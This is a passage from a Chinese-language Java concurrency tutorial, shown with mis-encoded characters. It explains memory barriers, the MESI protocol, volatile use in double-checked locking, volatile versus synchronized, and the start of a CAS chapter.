<h4 data-id="heading-87">å†…å­˜å±éšœï¼ˆMemory Barrierï¼‰</h4>
<p><strong>ä»€ä¹ˆæ˜¯å†…å­˜å±éšœï¼Ÿ</strong></p>
<p>å†…å­˜å±éšœæ˜¯ä¸€ç±»CPUæŒ‡ä»¤ï¼Œç”¨äºï¼š</p>
<ul>
<li>âœ… <strong>é˜»æ­¢é‡æ’åº</strong>ï¼šç¡®ä¿å±éšœä¸¤ä¾§çš„æŒ‡ä»¤ä¸ä¼šé‡æ’åº</li>
<li>âœ… <strong>ä¿è¯å¯è§æ€§</strong>ï¼šå¼ºåˆ¶åˆ·æ–°ç¼“å­˜ï¼Œä½¿ä¿®æ”¹å¯¹å…¶ä»–CPUå¯è§</li>
</ul>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ul>
<li>å°±åƒé“è·¯ä¸Šçš„"æ æ†"ï¼Œé˜»æ­¢è½¦è¾†ï¼ˆæŒ‡ä»¤ï¼‰è·¨è¶Š</li>
<li>ç¡®ä¿æŒ‡ä»¤æŒ‰ç…§é¢„æœŸé¡ºåºæ‰§è¡Œ</li>
<li>å¼ºåˆ¶æ•°æ®åŒæ­¥åˆ°ä¸»å†…å­˜</li>
</ul>
<p><strong>JMMå®šä¹‰çš„å››ç§å†…å­˜å±éšœï¼š</strong></p>
<p><strong>1. LoadLoadå±éšœ</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">Load1;        <span class="hljs-comment">// åŠ è½½æ“ä½œ1</span>
LoadLoadå±éšœ; <span class="hljs-comment">// æ æ†</span>
Load2;        <span class="hljs-comment">// åŠ è½½æ“ä½œ2</span>
</code></pre>
<p>ä½œç”¨ï¼šç¡®ä¿Load1åœ¨Load2ä¹‹å‰æ‰§è¡Œ</p>
<p><strong>2. StoreStoreå±éšœ</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">Store1;        <span class="hljs-comment">// å­˜å‚¨æ“ä½œ1</span>
StoreStoreå±éšœ; <span class="hljs-comment">// æ æ†</span>
Store2;        <span class="hljs-comment">// å­˜å‚¨æ“ä½œ2</span>
</code></pre>
<p>ä½œç”¨ï¼šç¡®ä¿Store1çš„æ•°æ®åˆ·æ–°åˆ°ä¸»å†…å­˜ï¼Œå†æ‰§è¡ŒStore2</p>
<p><strong>3. LoadStoreå±éšœ</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">Load1;        <span class="hljs-comment">// åŠ è½½æ“ä½œ1</span>
LoadStoreå±éšœ; <span class="hljs-comment">// æ æ†</span>
Store2;        <span class="hljs-comment">// å­˜å‚¨æ“ä½œ2</span>
</code></pre>
<p>ä½œç”¨ï¼šç¡®ä¿Load1åœ¨Store2ä¹‹å‰æ‰§è¡Œ</p>
<p><strong>4. StoreLoadå±éšœ</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">Store1;        <span class="hljs-comment">// å­˜å‚¨æ“ä½œ1</span>
StoreLoadå±éšœ; <span class="hljs-comment">// æ æ†ï¼ˆæœ€é‡ï¼Œå¼€é”€æœ€å¤§ï¼‰</span>
Load2;         <span class="hljs-comment">// åŠ è½½æ“ä½œ2</span>
</code></pre>
<p>ä½œç”¨ï¼šç¡®ä¿Store1çš„æ•°æ®åˆ·æ–°åˆ°ä¸»å†…å­˜ï¼Œå†æ‰§è¡ŒLoad2</p>
<p><strong>volatileçš„å†…å­˜å±éšœæ’å…¥ç­–ç•¥ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
<span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;

<span class="hljs-comment">// volatileå†™æ“ä½œ</span>
a = <span class="hljs-number">1</span>;              <span class="hljs-comment">// æ™®é€šå†™</span>
â”€â”€â”€â”€â”€â”€â”€ StoreStoreå±éšœ â”€â”€â”€â”€â”€â”€â”€  â† ç¦æ­¢æ™®é€šå†™å’Œ<span class="hljs-keyword">volatile</span>å†™é‡æ’åº
x = <span class="hljs-number">1</span>;              <span class="hljs-comment">// volatileå†™</span>
â”€â”€â”€â”€â”€â”€â”€ StoreLoadå±éšœ â”€â”€â”€â”€â”€â”€â”€  â† ç¦æ­¢<span class="hljs-keyword">volatile</span>å†™å’Œåé¢çš„æ“ä½œé‡æ’åº

<span class="hljs-comment">// volatileè¯»æ“ä½œ</span>
<span class="hljs-type">int</span> <span class="hljs-variable">r1</span> <span class="hljs-operator">=</span> x;         <span class="hljs-comment">// volatileè¯»</span>
â”€â”€â”€â”€â”€â”€â”€ LoadLoadå±éšœ â”€â”€â”€â”€â”€â”€â”€  â† ç¦æ­¢<span class="hljs-keyword">volatile</span>è¯»å’Œåé¢çš„è¯»é‡æ’åº
â”€â”€â”€â”€â”€â”€â”€ LoadStoreå±éšœ â”€â”€â”€â”€â”€â”€â”€ â† ç¦æ­¢<span class="hljs-keyword">volatile</span>è¯»å’Œåé¢çš„å†™é‡æ’åº
<span class="hljs-type">int</span> <span class="hljs-variable">r2</span> <span class="hljs-operator">=</span> a;         <span class="hljs-comment">// æ™®é€šè¯»</span>
</code></pre>
<p><strong>å…³é”®ç‚¹ï¼š</strong></p>
<ul>
<li>volatileå†™å‰æ’å…¥StoreStoreå±éšœ</li>
<li>volatileå†™åæ’å…¥StoreLoadå±éšœ</li>
<li>volatileè¯»åæ’å…¥LoadLoadå’ŒLoadStoreå±éšœ</li>
<li>é€šè¿‡è¿™äº›å±éšœä¿è¯å¯è§æ€§å’Œæœ‰åºæ€§</li>
</ul>
<h4 data-id="heading-88">Lockå‰ç¼€æŒ‡ä»¤</h4>
<p><strong>x86æ¶æ„ä¸‹çš„å®ç°ï¼š</strong></p>
<p>volatileå†™æ“ä½œåœ¨x86æ¶æ„ä¸‹ä¼šè¢«ç¼–è¯‘ä¸ºå¸¦æœ‰<code>lock</code>å‰ç¼€çš„æŒ‡ä»¤ã€‚</p>
<p><strong>æ±‡ç¼–ä»£ç ç¤ºä¾‹ï¼ˆäº†è§£å³å¯ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-assembly" lang="assembly">; volatileå†™æ“ä½œ
mov    %eax,0x10(%esi)    ; å°†å€¼å†™å…¥å†…å­˜
lock addl $0x0,(%esp)     ; lockå‰ç¼€ï¼Œé”å®šç¼“å­˜è¡Œ
</code></pre>
<p><strong>lockå‰ç¼€çš„ä½œç”¨ï¼š</strong></p>
<ol>
<li>
<p><strong>é”å®šæ€»çº¿æˆ–ç¼“å­˜è¡Œ</strong></p>
<ul>
<li>åœ¨å¤šæ ¸CPUä¸­ï¼Œç¡®ä¿åªæœ‰ä¸€ä¸ªCPUèƒ½æ‰§è¡Œè¿™ä¸ªæŒ‡ä»¤</li>
<li>ä¿è¯æ“ä½œçš„åŸå­æ€§</li>
</ul>
</li>
<li>
<p><strong>åˆ·æ–°ç¼“å­˜</strong></p>
<ul>
<li>å°†ç¼“å­˜ä¸­çš„æ•°æ®å†™å›ä¸»å†…å­˜</li>
<li>ä½¿å…¶ä»–CPUçš„ç¼“å­˜å¤±æ•ˆ</li>
<li>ä¿è¯å¯è§æ€§</li>
</ul>
</li>
</ol>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ul>
<li>lockå‰ç¼€å°±åƒç»™æ“ä½œåŠ äº†ä¸€æŠŠ"é”"</li>
<li>ç¡®ä¿æ“ä½œæ˜¯åŸå­çš„ã€å¯è§çš„</li>
<li>CPUç¡¬ä»¶å±‚é¢çš„ä¿è¯</li>
</ul>
<h4 data-id="heading-89">MESIç¼“å­˜ä¸€è‡´æ€§åè®®</h4>
<p><strong>ä»€ä¹ˆæ˜¯MESIï¼Ÿ</strong></p>
<p>MESIæ˜¯å¤šæ ¸CPUçš„ç¼“å­˜ä¸€è‡´æ€§åè®®ï¼Œç”¨äºä¿è¯å¤šæ ¸CPUä¹‹é—´ç¼“å­˜çš„ä¸€è‡´æ€§ã€‚</p>
<p><strong>MESIçš„å››ç§çŠ¶æ€ï¼š</strong></p>






























<table><thead><tr><th>çŠ¶æ€</th><th>å…¨ç§°</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td><strong>M</strong></td><td>Modified</td><td>ç¼“å­˜è¡Œè¢«ä¿®æ”¹ï¼Œä¸ä¸»å†…å­˜ä¸ä¸€è‡´</td></tr><tr><td><strong>E</strong></td><td>Exclusive</td><td>ç¼“å­˜è¡Œç‹¬å ï¼Œä¸ä¸»å†…å­˜ä¸€è‡´</td></tr><tr><td><strong>S</strong></td><td>Shared</td><td>ç¼“å­˜è¡Œå…±äº«ï¼Œä¸ä¸»å†…å­˜ä¸€è‡´</td></tr><tr><td><strong>I</strong></td><td>Invalid</td><td>ç¼“å­˜è¡Œæ— æ•ˆï¼Œéœ€è¦ä»ä¸»å†…å­˜åŠ è½½</td></tr></tbody></table>
<p><strong>volatileå˜é‡çš„ç¼“å­˜ä¸€è‡´æ€§ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">åœºæ™¯ï¼šCPU1å†™volatileå˜é‡

<span class="hljs-bullet">1.</span> CPU1ä¿®æ”¹volatileå˜é‡
   â†’ ç¼“å­˜è¡ŒçŠ¶æ€å˜ä¸ºMï¼ˆModifiedï¼‰

<span class="hljs-bullet">2.</span> é€šè¿‡æ€»çº¿å‘é€æ¶ˆæ¯
   â†’ é€šçŸ¥å…¶ä»–CPUï¼šè¿™ä¸ªç¼“å­˜è¡Œå·²å¤±æ•ˆ

<span class="hljs-bullet">3.</span> å…¶ä»–CPUæ”¶åˆ°æ¶ˆæ¯
   â†’ å°†å¯¹åº”ç¼“å­˜è¡ŒçŠ¶æ€æ”¹ä¸ºIï¼ˆInvalidï¼‰

<span class="hljs-bullet">4.</span> å…¶ä»–CPUè¯»å–æ—¶
   â†’ å‘ç°ç¼“å­˜æ— æ•ˆï¼Œä»ä¸»å†…å­˜é‡æ–°åŠ è½½
   â†’ ä¿è¯è¯»åˆ°æœ€æ–°å€¼
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦MESIï¼Ÿ</strong></p>
<ul>
<li>æ¯ä¸ªCPUæœ‰è‡ªå·±çš„ç¼“å­˜</li>
<li>éœ€è¦ä¿è¯æ‰€æœ‰CPUçœ‹åˆ°çš„æ•°æ®ä¸€è‡´</li>
<li>MESIåè®®è‡ªåŠ¨å¤„ç†ç¼“å­˜ä¸€è‡´æ€§</li>
</ul>
<h3 data-id="heading-90">4.3 volatileçš„ä½¿ç”¨åœºæ™¯</h3>
<h4 data-id="heading-91">çŠ¶æ€æ ‡å¿—</h4>
<p><strong>æœ€å¸¸ç”¨çš„åœºæ™¯ï¼š</strong> ä½¿ç”¨volatileä½œä¸ºçº¿ç¨‹é—´çš„çŠ¶æ€æ ‡å¿—</p>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âœ… æ¨èï¼šä½¿ç”¨volatileä½œä¸ºçŠ¶æ€æ ‡å¿—</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">shutdown</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shutdown</span><span class="hljs-params">()</span> {
    shutdown = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// å…¶ä»–çº¿ç¨‹èƒ½ç«‹å³çœ‹åˆ°</span>
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doWork</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">while</span> (!shutdown) {
        <span class="hljs-comment">// æ‰§è¡Œä»»åŠ¡</span>
        <span class="hljs-comment">// èƒ½åŠæ—¶å“åº”shutdownçš„å˜åŒ–</span>
    }
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆé€‚åˆç”¨volatileï¼Ÿ</strong></p>
<ul>
<li>âœ… åªéœ€è¦å¯è§æ€§ï¼ˆçº¿ç¨‹é—´é€šä¿¡ï¼‰</li>
<li>âœ… ä¸éœ€è¦åŸå­æ€§ï¼ˆåªæ˜¯booleanæ ‡å¿—ï¼‰</li>
<li>âœ… ç®€å•é«˜æ•ˆï¼ˆæ¯”synchronizedè½»é‡ï¼‰</li>
</ul>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>âœ… çº¿ç¨‹å¯åŠ¨/åœæ­¢æ ‡å¿—</li>
<li>âœ… é…ç½®å¼€å…³</li>
<li>âœ… çŠ¶æ€åˆ‡æ¢æ ‡å¿—</li>
</ul>
<h4 data-id="heading-92">åŒé‡æ£€æŸ¥é”å®šï¼ˆDCLï¼‰</h4>
<p><strong>ä»€ä¹ˆæ˜¯DCLï¼Ÿ</strong></p>
<p>åŒé‡æ£€æŸ¥é”å®šæ˜¯ä¸€ç§å•ä¾‹æ¨¡å¼çš„å®ç°æ–¹å¼ï¼Œé€šè¿‡ä¸¤æ¬¡æ£€æŸ¥æ¥å‡å°‘é”çš„ä½¿ç”¨ã€‚</p>
<p><strong>é”™è¯¯çš„å•ä¾‹æ¨¡å¼ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šå¯èƒ½æœ‰é—®é¢˜</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Singleton instance;  <span class="hljs-comment">// æ²¡æœ‰volatile</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) {  <span class="hljs-comment">// ç¬¬ä¸€æ¬¡æ£€æŸ¥ï¼ˆæ— é”ï¼‰</span>
            <span class="hljs-keyword">synchronized</span>(Singleton.class) {
                <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) {  <span class="hljs-comment">// ç¬¬äºŒæ¬¡æ£€æŸ¥ï¼ˆæœ‰é”ï¼‰</span>
                    instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();  <span class="hljs-comment">// âš ï¸ å¯èƒ½é‡æ’åº</span>
                }
            }
        }
        <span class="hljs-keyword">return</span> instance;
    }
}
</code></pre>
<p><strong>é—®é¢˜ï¼šå¯¹è±¡åˆ›å»ºå¯èƒ½é‡æ’åº</strong></p>
<p><code>new Singleton()</code>åŒ…å«ä¸‰ä¸ªæ­¥éª¤ï¼Œå¯èƒ½è¢«é‡æ’åºï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ­£å¸¸é¡ºåº</span>
<span class="hljs-number">1.</span> åˆ†é…å†…å­˜ç©ºé—´
<span class="hljs-number">2.</span> åˆå§‹åŒ–å¯¹è±¡ï¼ˆè°ƒç”¨æ„é€ å‡½æ•°ï¼‰
<span class="hljs-number">3.</span> å°†å¼•ç”¨èµ‹å€¼ç»™instance

<span class="hljs-comment">// å¯èƒ½é‡æ’åºä¸ºï¼ˆå±é™©ï¼ï¼‰</span>
<span class="hljs-number">1.</span> åˆ†é…å†…å­˜ç©ºé—´
<span class="hljs-number">3.</span> å°†å¼•ç”¨èµ‹å€¼ç»™instance  <span class="hljs-comment">// instance != nullï¼Œä½†å¯¹è±¡æœªåˆå§‹åŒ–ï¼</span>
<span class="hljs-number">2.</span> åˆå§‹åŒ–å¯¹è±¡

<span class="hljs-comment">// é—®é¢˜ï¼šçº¿ç¨‹Bå¯èƒ½æ‹¿åˆ°æœªå®Œå…¨åˆå§‹åŒ–çš„å¯¹è±¡</span>
</code></pre>
<p><strong>ä½¿ç”¨volatileè§£å†³ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âœ… æ­£ç¡®ï¼šä½¿ç”¨volatile</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">volatile</span> Singleton instance;  <span class="hljs-comment">// volatileç¦æ­¢é‡æ’åº</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">synchronized</span>(Singleton.class) {
                <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) {
                    instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();  
                    <span class="hljs-comment">// volatileä¿è¯ï¼šå…ˆåˆå§‹åŒ–å¯¹è±¡ï¼Œå†èµ‹å€¼</span>
                }
            }
        }
        <span class="hljs-keyword">return</span> instance;
    }
}
</code></pre>
<p><strong>volatileçš„ä½œç”¨ï¼š</strong></p>
<ul>
<li>âœ… <strong>ç¦æ­¢é‡æ’åº</strong>ï¼šç¡®ä¿å¯¹è±¡å®Œå…¨åˆå§‹åŒ–åæ‰èµ‹å€¼</li>
<li>âœ… <strong>ä¿è¯å¯è§æ€§</strong>ï¼šå…¶ä»–çº¿ç¨‹èƒ½çœ‹åˆ°å®Œæ•´çš„å¯¹è±¡</li>
</ul>
<p><strong>DCLçš„å·¥ä½œåŸç†ï¼š</strong></p>
<pre><code class="hljs language-csharp" lang="csharp">ç¬¬ä¸€æ¬¡æ£€æŸ¥ï¼ˆæ— é”ï¼‰ï¼šå¿«é€Ÿè·¯å¾„ï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹ç›´æ¥è¿”å›
  â†“
  å¦‚æœä¸º<span class="hljs-literal">null</span>ï¼Œè¿›å…¥åŒæ­¥å—
  â†“
ç¬¬äºŒæ¬¡æ£€æŸ¥ï¼ˆæœ‰é”ï¼‰ï¼šç¡®ä¿åªåˆ›å»ºä¸€ä¸ªå®ä¾‹
  â†“
  å¦‚æœä»ä¸º<span class="hljs-literal">null</span>ï¼Œåˆ›å»ºå®ä¾‹
</code></pre>
<p><strong>ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>ç¬¬ä¸€æ¬¡æ£€æŸ¥æ— é”ï¼Œæ€§èƒ½å¥½</li>
<li>åªåœ¨ç¬¬ä¸€æ¬¡åˆ›å»ºæ—¶åŠ é”</li>
<li>ä¹‹åéƒ½æ˜¯æ— é”è®¿é—®</li>
</ul>
<h4 data-id="heading-93">å•ä¾‹æ¨¡å¼ä¸­çš„åº”ç”¨</h4>
<p><strong>æšä¸¾æ–¹å¼ï¼ˆæ¨èï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">Singleton</span> {
    INSTANCE;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doSomething</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// ...</span>
    }
}
</code></pre>
<p><strong>é™æ€å†…éƒ¨ç±»æ–¹å¼ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span><span class="hljs-params">()</span> {}
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Holder</span> {
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Singleton</span> <span class="hljs-variable">INSTANCE</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> Holder.INSTANCE;
    }
}
</code></pre>
<h3 data-id="heading-94">4.4 volatile vs synchronized</h3>
<h4 data-id="heading-95">æ€§èƒ½å¯¹æ¯”</h4>
<p><strong>volatileçš„æ€§èƒ½ï¼š</strong></p>
<ul>
<li>âœ… <strong>è¯»æ“ä½œ</strong>ï¼šæ€§èƒ½æ¥è¿‘æ™®é€šå˜é‡ï¼ˆåªæ˜¯ä»ä¸»å†…å­˜è¯»ï¼‰</li>
<li>âš ï¸ <strong>å†™æ“ä½œ</strong>ï¼šéœ€è¦åˆ·æ–°ç¼“å­˜ï¼Œæ€§èƒ½ç•¥å·®ï¼ˆä½†æ¯”synchronizedå¥½ï¼‰</li>
<li>âœ… <strong>æ€»ä½“</strong>ï¼šæ€§èƒ½ä¼˜äºsynchronized</li>
</ul>
<p><strong>synchronizedçš„æ€§èƒ½ï¼š</strong></p>
<ul>
<li><strong>JDK 1.6ä¹‹å‰</strong>ï¼šé‡é‡çº§é”ï¼Œæ€§èƒ½è¾ƒå·®</li>
<li><strong>JDK 1.6ä¹‹å</strong>ï¼šé”å‡çº§ä¼˜åŒ–ï¼Œæ€§èƒ½å¤§å¹…æå‡</li>
<li><strong>æ€»ä½“</strong>ï¼šåœ¨ä½ç«äº‰æƒ…å†µä¸‹ï¼Œæ€§èƒ½æ¥è¿‘volatile</li>
</ul>
<p><strong>æ€§èƒ½å¯¹æ¯”ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">ä½ç«äº‰åœºæ™¯ï¼š
<span class="hljs-keyword">volatile</span>: å¾ˆå¿«ï¼ˆå‡ ä¹æ— å¼€é”€ï¼‰
<span class="hljs-keyword">synchronized</span>: è¾ƒå¿«ï¼ˆåå‘é”/è½»é‡çº§é”ï¼‰

é«˜ç«äº‰åœºæ™¯ï¼š
<span class="hljs-keyword">volatile</span>: ä»ç„¶å¾ˆå¿«ï¼ˆåªæ˜¯åˆ·æ–°ç¼“å­˜ï¼‰
<span class="hljs-keyword">synchronized</span>: å¯èƒ½å˜æ…¢ï¼ˆå‡çº§ä¸ºé‡é‡çº§é”ï¼‰
</code></pre>
<h4 data-id="heading-96">ä½¿ç”¨åœºæ™¯å¯¹æ¯”</h4>
<p><strong>åŠŸèƒ½å¯¹æ¯”è¡¨ï¼š</strong></p>








































<table><thead><tr><th>ç‰¹æ€§</th><th>volatile</th><th>synchronized</th></tr></thead><tbody><tr><td><strong>å¯è§æ€§</strong></td><td>âœ… ä¿è¯</td><td>âœ… ä¿è¯</td></tr><tr><td><strong>åŸå­æ€§</strong></td><td>âŒ ä¸ä¿è¯</td><td>âœ… ä¿è¯</td></tr><tr><td><strong>æœ‰åºæ€§</strong></td><td>âœ… ä¿è¯</td><td>âœ… ä¿è¯</td></tr><tr><td><strong>äº’æ–¥æ€§</strong></td><td>âŒ ä¸ä¿è¯</td><td>âœ… ä¿è¯</td></tr><tr><td><strong>æ€§èƒ½</strong></td><td>âœ… è¾ƒé«˜</td><td>âš ï¸ ä¸­ç­‰</td></tr><tr><td><strong>ä½¿ç”¨å¤æ‚åº¦</strong></td><td>âœ… ç®€å•</td><td>âš ï¸ ä¸­ç­‰</td></tr></tbody></table>
<p><strong>volatileé€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>âœ… <strong>çŠ¶æ€æ ‡å¿—</strong>ï¼šbooleanç±»å‹çš„çº¿ç¨‹é—´é€šä¿¡</li>
<li>âœ… <strong>åŒé‡æ£€æŸ¥é”å®š</strong>ï¼šå•ä¾‹æ¨¡å¼</li>
<li>âœ… <strong>è¯»å¤šå†™å°‘</strong>ï¼šåªéœ€è¦å¯è§æ€§ï¼Œä¸éœ€è¦äº’æ–¥</li>
<li>âœ… <strong>ç‹¬ç«‹è§‚å¯Ÿ</strong>ï¼šå‘å¸ƒè§‚å¯Ÿç»“æœç»™å…¶ä»–çº¿ç¨‹</li>
</ul>
<p><strong>synchronizedé€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>âœ… <strong>éœ€è¦åŸå­æ€§</strong>ï¼šå¤šæ­¥éª¤æ“ä½œéœ€è¦åŸå­æ‰§è¡Œ</li>
<li>âœ… <strong>éœ€è¦äº’æ–¥</strong>ï¼šåŒä¸€æ—¶åˆ»åªèƒ½æœ‰ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œ</li>
<li>âœ… <strong>å¤æ‚åŒæ­¥</strong>ï¼šéœ€è¦æ›´å¤æ‚çš„åŒæ­¥é€»è¾‘</li>
</ul>
<p><strong>é€‰æ‹©å»ºè®®ï¼š</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">åªéœ€è¦å¯è§æ€§ï¼Ÿ
  â”œâ”€ æ˜¯ â†’ ä½¿ç”¨<span class="hljs-keyword">volatile</span> âœ…
  â””â”€ å¦ â†’ éœ€è¦åŸå­æ€§ï¼Ÿ
       â”œâ”€ æ˜¯ â†’ ä½¿ç”¨<span class="hljs-keyword">synchronized</span>æˆ–åŸå­ç±»
       â””â”€ å¦ â†’ æ ¹æ®å…·ä½“æƒ…å†µé€‰æ‹©

è¯»å¤šå†™å°‘ï¼Ÿ
  â”œâ”€ æ˜¯ â†’ <span class="hljs-keyword">volatile</span> + CAS âœ…
  â””â”€ å¦ â†’ <span class="hljs-keyword">synchronized</span>

ç®€å•æ ‡å¿—ï¼Ÿ
  â”œâ”€ æ˜¯ â†’ <span class="hljs-keyword">volatile</span> âœ…
  â””â”€ å¦ â†’ <span class="hljs-keyword">synchronized</span>
</code></pre>
<p><strong>å®é™…å»ºè®®ï¼š</strong></p>
<ul>
<li><strong>çŠ¶æ€æ ‡å¿—</strong>ï¼šä¼˜å…ˆä½¿ç”¨volatile</li>
<li><strong>è®¡æ•°å™¨ç­‰</strong>ï¼šä½¿ç”¨åŸå­ç±»ï¼ˆAtomicIntegerï¼‰</li>
<li><strong>å¤æ‚åŒæ­¥</strong>ï¼šä½¿ç”¨synchronized</li>
<li><strong>è¯»å¤šå†™å°‘</strong>ï¼švolatile + CAS</li>
</ul>
<hr/>
<h2 data-id="heading-97">ç¬¬äº”ç«  CASï¼ˆCompare-And-Swapï¼‰</h2>
<h3 data-id="heading-98">5.1 CASåŸç†</h3>
<h4 data-id="heading-99">CASæ“ä½œçš„å®šä¹‰</h4>
<p>**CASï¼ˆCompare-And-Swapï¼‰**æ˜¯ä¸€ç§æ— é”çš„åŸå­æ“ä½œï¼Œç”¨äºå®ç°å¤šçº¿ç¨‹åŒæ­¥ã€‚</p>
<p><strong>ä»€ä¹ˆæ˜¯CASï¼Ÿ</strong></p>
<ul>
<li>CASæ˜¯"æ¯”è¾ƒå¹¶äº¤æ¢"çš„æ„æ€</li>
<li>å®ƒæ˜¯ä¸€ç§ä¹è§‚é”çš„å®ç°æ–¹å¼</li>
<li>ä¸åƒæ‚²è§‚é”ï¼ˆå¦‚synchronizedï¼‰å…ˆè·å–é”å†æ“ä½œï¼ŒCASå…ˆå°è¯•æ“ä½œï¼Œå¤±è´¥äº†å†é‡è¯•</li>
</ul>
<p><strong>ç”Ÿæ´»åŒ–ç†è§£ï¼š</strong></p>
<ul>
<li>æƒ³è±¡ä¸€ä¸ªå‚¨ç‰©æŸœï¼Œä½ æƒ³æŠŠé‡Œé¢çš„ä¸œè¥¿æ¢æ‰</li>
<li>CASå°±æ˜¯ï¼šå…ˆçœ‹çœ‹é‡Œé¢æ˜¯ä¸æ˜¯ä½ æœŸæœ›çš„ä¸œè¥¿ï¼ˆæ¯”è¾ƒï¼‰</li>
<li>å¦‚æœæ˜¯ï¼Œå°±æ¢æˆæ–°çš„ï¼ˆäº¤æ¢ï¼‰</li>
<li>å¦‚æœä¸æ˜¯ï¼Œè¯´æ˜è¢«åˆ«äººæ¢è¿‡äº†ï¼Œé‡æ–°è¯»å–å†å°è¯•</li>
</ul>
<p><strong>CASæ“ä½œåŒ…å«ä¸‰ä¸ªæ“ä½œæ•°ï¼š</strong></p>
<ul>
<li><strong>å†…å­˜ä½ç½®ï¼ˆVï¼‰</strong>ï¼šè¦æ›´æ–°çš„å˜é‡ï¼ˆå°±åƒå‚¨ç‰©æŸœçš„ä½ç½®ï¼‰</li>
<li><strong>é¢„æœŸå€¼ï¼ˆAï¼‰</strong>ï¼šæœŸæœ›çš„æ—§å€¼ï¼ˆä½ æœŸæœ›çœ‹åˆ°çš„æ—§ä¸œè¥¿ï¼‰</li>
<li><strong>æ–°å€¼ï¼ˆBï¼‰</strong>ï¼šè¦è®¾ç½®çš„æ–°å€¼ï¼ˆä½ æƒ³æ”¾è¿›å»çš„æ–°ä¸œè¥¿ï¼‰</li>
</ul>
<p><strong>CASæ“ä½œé€»è¾‘ï¼ˆç®€å•ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> è¯»å–å½“å‰å€¼ V
<span class="hljs-bullet">2.</span> æ¯”è¾ƒï¼šV æ˜¯å¦ç­‰äºé¢„æœŸå€¼ Aï¼Ÿ
<span class="hljs-bullet">   -</span> å¦‚æœç›¸ç­‰ â†’ å°† V æ›´æ–°ä¸º Bï¼ˆäº¤æ¢æˆåŠŸï¼‰
<span class="hljs-bullet">   -</span> å¦‚æœä¸ç›¸ç­‰ â†’ ä¸æ›´æ–°ï¼ˆäº¤æ¢å¤±è´¥ï¼Œå¯èƒ½è¢«åˆ«äººæ”¹è¿‡äº†ï¼‰
